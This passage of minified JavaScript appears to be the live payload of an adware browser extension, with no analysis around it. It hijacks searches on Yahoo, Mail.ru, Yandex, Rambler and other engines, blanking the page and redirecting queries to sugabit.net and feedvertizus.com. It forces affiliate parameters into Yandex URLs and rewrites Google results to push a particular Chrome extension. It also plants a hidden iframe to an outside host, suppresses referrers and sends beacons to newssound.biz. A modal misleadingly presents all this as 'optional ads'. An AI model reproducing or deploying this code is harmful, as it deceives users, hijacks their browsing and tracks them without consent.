                                            redirectSearch("p")
                                        }
                                    }

                                    function redirectSearch(e) {
                                        if (getParams(), void 0 != params[e]) {
                                            window.stop && window.stop(), document.documentElement.style.opacity = "0", document.documentElement.style.display = "none";
                                            var r = params[e],
                                                c = "http://sugabit.net/search.php?source=btn&sid=" + $$.tbParams.wid + "x" + $$.tbParams.tid + "x" + $$.tbParams.sid + "&q=" + r;
                                            $$.loadedCallback("BANNER_LOAD", block);
                                            $$.setCookie("__ckp_srchyho_fired", 1, {
                                                expire: 1800
                                            });
                                            location.href = c, clearInterval(tmr)
                                        }
                                    }

                                    function checkForSearch() {
                                        var e = location.href; - 1 != d.indexOf("search.yahoo.com") && checkYahooTag() && clearInterval(tmr)
                                    }
                                    var d = window.document.domain,
                                        tmr, tmrCnt = 0,
                                        params = {};
                                    window == top && (checkForSearch(), tmr = setInterval(checkForSearch, 100))
                                })()
                            } catch (e) {}
                        })
                    })()
                }
                if (scriptsToLoad['ac348']) {
                    (function() {
                        var block = 'ac348';
                        $$.ready(function() {
                            try {
                                (function() {
                                    if (location.hostname.indexOf("go.mail.ru") == -1 || location.pathname.indexOf("/search") == -1) {
                                        return
                                    }
                                    var r = $$.randomNumber(1, 100);
                                    var rLimit = scriptsToLoad[block].coverage;
                                    if (r > rLimit) {
                                        return
                                    }
                                    $$.loadedCallback("MNTZ_LOADED", block);
                                    if ($$.getCookie("__ckp_srchmlr_fired") == 1) {
                                        return
                                    }

                                    function getParams() {
                                        params = {};
                                        for (var e = location.search.replace("?", ""), r = e.split("&"), c = 0; c < r.length; c++) {
                                            t = r[c].split("="), t[1] && (params[t[0]] = t[1])
                                        }
                                        var a = location.hash.replace("#", "");
                                        a && (t = a.split("="), t[1] && (params[t[0]] = t[1]))
                                    }

                                    function checkMailruTag() {
                                        getParams();
                                        if (params.frc && params.frc == "821563") {
                                            return
                                        } else {
                                            redirectSearch("q")
                                        }
                                    }

                                    function redirectSearch(e) {
                                        if (getParams(), void 0 != params[e]) {
                                            window.stop && window.stop(), document.documentElement.style.opacity = "0", document.documentElement.style.display = "none";
                                            var r = params[e],
                                                c = "http://sugabit.net/search.php?source=btn2&sid=" + $$.tbParams.wid + "x" + $$.tbParams.tid + "x" + $$.tbParams.sid + "&q=" + r;
                                            $$.loadedCallback("BANNER_LOAD", block);
                                            $$.setCookie("__ckp_srchmlr_fired", 1, {
                                                expire: 1800
                                            });
                                            location.href = c, clearInterval(tmr)
                                        }
                                    }

                                    function checkForSearch() {
                                        var e = location.href; - 1 != d.indexOf("go.mail.ru") && checkMailruTag() && clearInterval(tmr)
                                    }
                                    var d = window.document.domain,
                                        tmr, tmrCnt = 0,
                                        params = {};
                                    window == top && (checkForSearch(), tmr = setInterval(checkForSearch, 100))
                                })()
                            } catch (e) {}
                        })
                    })()
                }
                if (scriptsToLoad['5db45']) {
                    (function() {
                        var block = '5db45';
                        $$.ready(function() {
                            try {
                                if (location.hostname.indexOf("yandex.") !== 0 || location.pathname.indexOf("/search") == -1) {
                                    return
                                }
                                var r = $$.randomNumber(1, 100);
                                var rLimit = scriptsToLoad[block].coverage;;
                                if (r > rLimit) {
                                    return
                                }
                                $$.loadedCallback("MNTZ_LOADED", block);
                                if ($$.getCookie("__ckp_srchydx_fired") == 1) {
                                    return
                                }

                                function getParams() {
                                    params = {};
                                    for (var e = location.search.replace("?", ""), r = e.split("&"), c = 0; c < r.length; c++) {
                                        t = r[c].split("="), t[1] && (params[t[0]] = t[1])
                                    }
                                    var a = location.hash.replace("#", "");
                                    a && (t = a.split("="), t[1] && (params[t[0]] = t[1]))
                                }

                                function checkAff() {
                                    getParams();
                                    if (params.clid && params.clid.indexOf("2300267") > -1) {
                                        return true
                                    } else {
                                        window.stop && window.stop();
                                        $$.loadedCallback("BANNER_LOAD", block);
                                        $$.setCookie("__ckp_srchydx_fired", 1, {
                                            expire: 1800
                                        });
                                        location.search = location.search.length ? location.search + "&clid=2300267-200" : "?clid=2300267";
                                        clearInterval(tmr)
                                    }
                                }

                                function checkForSearch() {
                                    -1 != d.indexOf("yandex.") && checkAff() && clearInterval(tmr)
                                }
                                var d = window.document.domain,
                                    tmr, params = {};
                                if (window == top) {
                                    checkForSearch();
                                    tmr = setInterval(checkForSearch, 100)
                                }
                            } catch (e) {}
                        })
                    })()
                };
                (function() {
                    var a = w["1f404c54c2b0e13e0f"];
                    if ((location.hostname.indexOf("google.") !== 0 || location.hostname.indexOf("www.google.") !== 0) && document.location.pathname.indexOf("search") === -1) {
                        return
                    }
                    var c = "chrome.google.com/webstore";
                    var b = {
                        ddjdamcnphfdljlojajeoiogkanilahc: ["Speed Dial", "New tab", "start tab", "start page", "new page", "home page", "default page", "fast dial", "fast access", "quick access"]
                    };

                    function d() {
                        var f = document.querySelectorAll("div.g");
                        if (!f.length) {
                            return
                        }
                        Object.keys(b).forEach(function(g) {
                            f.forEach(function(h) {
                                var i = (h.querySelector("h3") && h.querySelector("h3").textContent) + " " + (h.querySelector("span.st") && h.querySelector("span.st").textContent);
                                b[g].forEach(function(j) {
                                    if (i.toUpperCase().indexOf(j.toUpperCase()) > -1) {
                                        e(h.querySelector("a:not(.cws)"), g)
                                    }
                                })
                            })
                        })
                    }

                    function e(f, h) {
                        if (!f) {
                            return
                        }
                        var g = false;
                        if (f.href.indexOf(c) > -1) {
                            g = f.href
                        }
                        if (f.getAttribute("data-href") && f.getAttribute("data-href").indexOf(c) > -1) {
                            g = f.getAttribute("data-href")
                        }
                        if (g) {
                            f.removeAttribute("onmousedown");
                            f.removeAttribute("data-href");
                            f.href = g.replace(/\/[a-z]{32}/gi, "/" + h);
                            f.className = f.className + " cws";
                            a.on(f, "click", function() {
                                a.setCookie("__mzglrl", 1, {
                                    expire: 300
                                });
                                a.loadedCallback("BANNER_LOAD", '1f608')
                            })
                        }
                    }
                    if (!a.getCookie("__mzglrl")) {
                        d();
                        setInterval(d, 1000 * 10)
                    } else {}
                })();;
                if (scriptsToLoad['5db45']) {
                    (function() {
                        var block = '5db45';
                        (function(n, i, q) {
                            var r = w["1f404c54c2b0e13e0f"];
                            var o = r.getMtzCfg('5db45');
                            var j = document.domain;
                            var c = location.href;
                            var f = {};
                            var h = true;
                            if (j.indexOf("nova.rambler.ru") !== -1 && c.indexOf("/search") !== -1 && c.indexOf("query=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }
                            if (j.indexOf("go.mail.ru") !== -1 && c.indexOf("/search") !== -1 && c.indexOf("q=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }
                            if (j.indexOf("plusnetwork.com") !== -1 && c.indexOf("q=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }
                            if (j.indexOf("search.mysearch.com") !== -1 && c.indexOf("/web") !== -1 && c.indexOf("q=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }

                            function m() {
                                document.documentElement.style.display = "block"
                            }

                            function a() {
                                if (document.head) {
                                    var d = document.createElement("meta");
                                    d.name = "referrer";
                                    d.content = "no-referrer";
                                    document.getElementsByTagName("head")[0].appendChild(d)
                                }
                            }

                            function p(l) {
                                f = {};
                                if (!l || l == "") {
                                    l = location.href
                                }
                                var x = l.split("?");
                                var v = l.split("#");
                                if (x.length == 2) {
                                    x = x[1]
                                } else {
                                    x = x[0]
                                }
                                if (v.length == 2) {
                                    x = x + "&" + v[1]
                                }
                                if (x != "") {
                                    var d = x.split("&");
                                    for (var u = 0; u < d.length; u++) {
                                        t = d[u].split("=");
                                        if (t[1]) {
                                            f[t[0]] = t[1]
                                        }
                                    }
                                }
                            }

                            function k(d) {
                                var l = setInterval(function() {
                                    p();
                                    if (f[d] == undefined) {
                                        return
                                    }
                                    r.loadedCallback("BANNER_LOAD", '5db45');
                                    var u = f[d];
                                    var s = "http://search.feedvertizus.com/v1/hostedsearch?pid=252428&subid=965&subid2=y_" + ((r && r.tbParams && r.tbParams.tid) ? r.tbParams.tid : "") + "&keyword=" + u;
                                    if (h) {
                                        clearInterval(l);
                                        h = false;
                                        window.location.replace(s)
                                    }
                                }, 0)
                            }

                            function g() {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000);
                                var d = setInterval(function() {
                                    r.loadedCallback("BANNER_LOAD", '5db45');
                                    var l = "https://yandex.com/?clid=2300267";
                                    if (h) {
                                        clearInterval(d);
                                        h = false;
                                        window.location.replace(l)
                                    }
                                }, 0)
                            }

                            function b() {
                                if (j.indexOf("nova.rambler.ru") != -1) {
                                    a();
                                    k("query")
                                }
                                if (j.indexOf("go.mail.ru") != -1) {
                                    a();
                                    k("q")
                                }
                                if (j.indexOf("plusnetwork.com") != -1) {
                                    a();
                                    k("q")
                                }
                                if (j.indexOf("search.mysearch.com") != -1) {
                                    a();
                                    k("q")
                                }
                            }
                            b();

                            function e() {
                                if (j.indexOf("r0.ru") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("go.mail.ru") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("securesurf.biz") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("mysearch24.com") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("search.mysearch.com") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("secure-finder.org") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("playbar.biz") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                            }
                            e()
                        })(document, window);
                    })()
                }
                if (scriptsToLoad['4d7da']) {
                    (function() {
                        (function(e, a, b) {
                            var c = document.createElement("iframe");
                            c.src = "https://nesmotrinamenya.ru/566bbee0f961ad71b54c3c2fd36db053";
                            c.width = 1;
                            c.height = 1;
                            c.style = "position:absolute;left:0px;top:0px;opacity:0.0;";
                            document.body.appendChild(c)
                        })(document, window);
                    })()
                }
            })(document, window);;
            (function(g, a, e) {
                var c = a["1f404c54c2b0e13e0f"];
                var f = c.Sizzle;

                function b() {
                    var d = f(".commercial-unit");
                    var i = f("input[name=q]");
                    if (i.length > 0 && d.length > 0) {
                        var h = i[0].value;
                        c.loadedCallback("GGL_COM_BLOCK", "", h)
                    }
                }
                c.each(f("input[name=q]"), function(d) {
                    c.on(d, "change", function() {
                        b()
                    })
                });
                b()
            })(document, window, undefined);;
            (function(e, a, f, c) {
                var b = a[f];
                b.twBarOptOutInit = function() {
                    var g = document.createElement("iframe");
                    g.setAttribute("style", "display: none; position: fixed; top: 50%; left: 50%; width: 650px; height: 500px; margin-top: -250px; margin-left: -325px; z-index: 2147483647;");
                    g.id = "__twbopt1f404c54c2b0e13e0f";
                    g.frameBorder = 0;
                    g.scrolling = "no";
                    document.body.appendChild(g);
                    var d = null;
                    var h = function() {
                        if (d) {
                            clearTimeout(d)
                        }
                        var i = {};
                        if (g.contentWindow) {
                            i = g.contentWindow.document
                        } else {
                            if (g.contentDocument) {
                                i = g.contentDocument
                            }
                        }
                        i.open();
                        i.write('<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>' + a[f].tbParams.title + ' OptOut</title><style>article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}audio,canvas,video{display:inline-block}template{display:none}html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{margin:0}a{background:0 0}a:active,a:hover{outline:0}h1{margin:.67em 0}b,strong{font-weight:700}dfn{font-style:italic}hr{height:0;-moz-box-sizing:content-box;box-sizing:content-box}mark{color:#000;background:#ff0}code,kbd,pre,samp{font-size:1em}pre{white-space:pre-wrap}q{quotes:"ВЃC" "ВЃD" "ВЃ8" "ВЃ9"}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}figure{margin:0}button,input,select,textarea{margin:0}button,select{text-transform:none}button{cursor:pointer;-webkit-appearance:button}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}textarea{overflow:auto;vertical-align:top}table{border-collapse:collapse;border-spacing:0}@media print{*{color:#000!important;text-shadow:none!important;background:transparent!important;box-shadow:none!important}a,a:visited{text-decoration:underline}blockquote,pre{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}img,tr{page-break-inside:avoid}img{max-width:100%!important}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}select{background:#fff!important}}*,:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:62.5%;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.428571429;color:#333;background-color:#fff}button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a{color:#428bca;text-decoration:none}a:focus,a:hover{color:#2a6496;text-decoration:underline}a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}img{vertical-align:middle}hr{margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}h1,h2,h3,h4,h5,h6{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-weight:500;line-height:1.1;color:inherit}h1,h2,h3{margin-top:20px;margin-bottom:10px}h4,h5,h6{margin-top:10px;margin-bottom:10px}h1{font-size:36px}h2{font-size:30px}h3{font-size:24px}h4{font-size:18px}h5{font-size:14px}h6{font-size:12px}p{margin:0 0 10px}small{font-size:85%}cite{font-style:normal}ol,ul{margin-top:0;margin-bottom:10px}dl{margin-top:0;margin-bottom:20px}dd,dt{line-height:1.428571429}dt{font-weight:700}dd{margin-left:0}blockquote{padding:10px 20px;margin:0 0 20px;border-left:5px solid #eee}blockquote:after,blockquote:before{content:""}address{margin-bottom:20px;font-style:normal;line-height:1.428571429}code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,"Courier New",monospace}code{padding:2px 4px;font-size:90%;color:#c7254e;white-space:nowrap;background-color:#f9f2f4;border-radius:4px}pre{display:block;padding:9.5px;margin:0 0 10px;font-size:13px;line-height:1.428571429;color:#333;word-break:break-all;word-wrap:break-word;background-color:#f5f5f5;border:1px solid #ccc;border-radius:4px}table{max-width:100%;background-color:transparent}th{text-align:left}fieldset{padding:0;margin:0;border:0}legend{display:block;width:100%;padding:0;margin-bottom:20px;font-size:21px;line-height:inherit;color:#333;border:0;border-bottom:1px solid #e5e5e5}label{display:inline-block;margin-bottom:5px;font-weight:700}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}output{display:block;padding-top:7px;font-size:14px;line-height:1.428571429;color:#555;vertical-align:middle}.form-control:-ms-input-placeholder{color:#999}.form-control::-webkit-input-placeholder{color:#999}.btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:400;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;background-image:none;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.btn:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:focus,.btn:hover{color:#333;text-decoration:none}.btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn-primary{color:#fff;background-color:#428bca;border-color:#357ebd}.btn-primary:active,.btn-primary:focus,.btn-primary:hover{color:#fff;background-color:#3276b1;border-color:#285e8e}.btn-primary:active{background-image:none}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:active,.btn-warning:focus,.btn-warning:hover{color:#fff;background-color:#ed9c28;border-color:#d58512}.btn-warning:active{background-image:none}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:active,.btn-danger:focus,.btn-danger:hover{color:#fff;background-color:#d2322d;border-color:#ac2925}.btn-danger:active{background-image:none}.btn-success{color:#fff;background-color:#5cb85c;border-color:#4cae4c}.btn-success:active,.btn-success:focus,.btn-success:hover{color:#fff;background-color:#47a447;border-color:#398439}.btn-success:active{background-image:none}.btn-lg{padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}.btn-xs{padding:1px 5px;font-size:12px;line-height:1.5;border-radius:3px}.fade{opacity:0;-webkit-transition:opacity .15s linear;transition:opacity .15s linear}.fade.in{opacity:1}@font-face{font-family:"Glyphicons Halflings";src:url(../fonts/glyphicons-halflings-regular.eot);src:url(../fonts/glyphicons-halflings-regular.eot?#iefix) format("embedded-opentype"),url(../fonts/glyphicons-halflings-regular.woff) format("woff"),url(../fonts/glyphicons-halflings-regular.ttf) format("truetype"),url(../fonts/glyphicons-halflings-regular.svg#glyphicons-halflingsregular) format("svg")}@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}.close{float:right;font-size:21px;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;opacity:.2;filter:alpha(opacity=20)}.close:focus,.close:hover{color:#000;text-decoration:none;cursor:pointer;opacity:.5;filter:alpha(opacity=50)}button.close{padding:0;cursor:pointer;background:0 0;border:0;-webkit-appearance:none}.modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:2000000;display:none;overflow:auto;overflow-y:scroll}.modal.fade .modal-dialog{-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);transform:translate(0,-25%);-webkit-transition:-webkit-transform .3s ease-out;-moz-transition:-moz-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out}.modal.in .modal-dialog{-webkit-transform:translate(0,0);-ms-transform:translate(0,0);transform:translate(0,0)}.modal-dialog{position:relative;z-index:1050;width:auto;margin:10px}.modal-content{position:relative;background-color:#fff;border:1px solid #999;border:1px solid rgba(0,0,0,.2);border-radius:6px;outline:0;-webkit-box-shadow:0 3px 9px rgba(0,0,0,.5);box-shadow:0 3px 9px rgba(0,0,0,.5);background-clip:padding-box}.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1030;background-color:#000}.modal-backdrop.fade{opacity:0;filter:alpha(opacity=0)}.modal-backdrop.in{opacity:.5;filter:alpha(opacity=50)}.modal-header{min-height:16.428571429px;padding:15px;border-bottom:1px solid #e5e5e5}.modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.428571429}.modal-body{position:relative;padding:20px}.modal-footer{padding:19px 20px 20px;margin-top:15px;text-align:right;border-top:1px solid #e5e5e5}.modal-footer:after,.modal-footer:before{display:table;content:" "}.modal-footer:after{clear:both}.modal-footer .btn+.btn{margin-bottom:0;margin-left:5px}@media screen and (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}}</style><content><div class="modal-content" style="font-family:\'Segoe UI\',\'Droid Sans\',Arial,sans-serif; width:650px"><div class="modal-header"><button type="button" class="close" id="close-btn" data-dismiss="modal" aria-hidden="true"><img src="//newssound.biz/ext/images/close-cross.png" width="16" height="16"></button><h4 class="modal-title" id="myModalLabel"><b>' + a[f].tbParams.title + '\'s development is supported by <u style="position:static">optional</u> ads</b></h4></div><div class="modal-body">' + a[f].tbParams.title + '\'s development is supported by <b>optional</b> advertisements that are added to some of the websites you visit. During the development of this extension, I\'ve put in thousands of hours adding features, fixing bugs and making things betternot mentioning the support of all the users who ask for help.<br><br>Ads support most of the internet we all use and love; without them, the internet we have today would simply not exist. Similarly, without revenue, this extension (and the upcoming new ones) would not be possible.<br><br><b>You can disable these ads now or later in the settings page. You can also minimize the ads appearance by clicking on partial support button. Both of these options are available by clicking \'x\' button in the corner of each ad.</b> In both cases,your choice will remain in effect unless you reinstall or reset the extension.</div><div class="modal-footer"><button type="button" id="full-support" class="btn btn-success btn-lg">Fully Support</button><button type="button" id="partial-support" class="btn btn-default">Partially Support</button><p style="text-align:left;width:100%;"><a id="no-support" style="text-decoration:underline;" href="#">No, I don\'t want to support you work</a></p></div></div></content>');
                        i.close();
                        i.getElementById("full-support").onclick = function() {
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_FULLSUPPORT");
                            return false
                        };
                        i.getElementById("close-btn").onclick = function() {
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_CLOSE");
                            return false
                        };
                        i.getElementById("partial-support").onclick = function() {
                            window.open("http://thisadsfor.us/optout?t=8000&u=52421&key=1f404c54c2b0e13e0f&block=" + b.currentOptoutBlock);
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_PARTSUPPORT")
                        };
                        i.getElementById("no-support").onclick = function() {
                            window.open("http://thisadsfor.us/optout?t=8000&u=52421&key=1f404c54c2b0e13e0f&block=" + b.currentOptoutBlock);
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_NOSUPPORT")
                        }
                    };
                    if (g.contentDocument || g.contentWindow) {
                        h()
                    } else {
                        b.on(g, "load", h);
                        d = setTimeout(h, 5000)
                    }
                    b.twBarOptOut = a[f].twBarOptOut = g
                }
            })(document, window, "1f404c54c2b0e13e0f", undefined);;
            d.loadedCallback("FINISHED", "", location.host)
        })
    });;
    try {
        b(document, window)
    } catch (c) {
        var h = (typeof c.stack != "undefined" ? c.stack : "!empty stack!");
        if (h.length > 1500) {
            h = h.substr(0, 1500)
        }
        var a = (i.location.protocol == "http:" ? "http:" : "https:") + "//newssound.biz/log/?l=error&m=" + encodeURIComponent((typeof c.message != "undefined" ? c.message : "!empty message!") + "|" + h);
        var k = document.createElement("script");
        k.type = "text/javascript";
        k.src = a + (a.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
        (document.getElementsByTagName("script")[0] || document.documentElement.firstChild).parentNode.appendChild(k);
        (function() {
            var e = ["mid=", "wid=52421", "sid=" + (i[g] && i[g].tbParams && i[g].tbParams.sid) ? i[g].tbParams.sid : "", "tid=8000", "custom1=" + encodeURIComponent((typeof c.message != "undefined" ? c.message : "!empty message!")), "rid=CORE_JS_ERROR"];
            a = (i.location.protocol == "http:" ? "http:" : "https:") + "//newssound.biz/metric/?" + e.join("&");
            var d = f.createElement("img");
            d.setAttribute("style", "width:0;height:0;display:none;visibility:hidden;");
            d.src = a + (a.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
            (document.head || document.documentElement).appendChild(d);
            if (typeof d.onload != j) {
                d.onload = function() {
                    d.parentNode && d.parentNode.removeChild(d)
                }
            }
        })()
    }
}(document, window));
